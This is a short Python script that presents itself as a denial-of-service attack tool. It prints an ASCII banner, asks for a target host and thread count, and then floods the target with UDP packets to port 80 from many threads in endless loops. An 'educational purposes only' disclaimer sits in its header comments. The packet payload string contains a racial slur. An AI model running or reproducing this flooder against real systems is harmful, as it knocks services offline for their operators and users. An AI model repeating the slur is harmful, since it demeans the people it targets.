# DOS attack with python and socket, threading, time libraries.
# Author: M-Taghizadeh (http://m-taghizadeh.ir)
# Note: This is for educational purposes only. Unauthorized DOS attacks are illegal and unethical.
# Always obtain explicit permission before testing any network.

import time
import socket
import sys
import threading

print(r"""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
""")

time.sleep(3)
site = input("Enter The Target URL: ")
thread_count = int(input("Enter the counts of threads: "))
ip = socket.gethostbyname(site)

UDP_PORT = 80
print("UDP target ip: ", ip)
print("UDP target port: ", UDP_PORT)
time.sleep(3)

def dos():
    while True:
        MESSAGE = b"trigger digger skibidy nigger"  # Changed to bytes for socket.sendto
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(MESSAGE, (ip, UDP_PORT))
        print(f'Packet Sent Successfully => Message: \033[94m {MESSAGE.decode()} \033[00m :)')

threads = []
for i in range(thread_count):
    try:
        t = threading.Thread(target=dos)
        t.start()
        threads.append(t)
    except KeyboardInterrupt:
        sys.exit(0)

# Wait for threads to finish (though they won't due to infinite loop)
for t in threads:
    t.join()
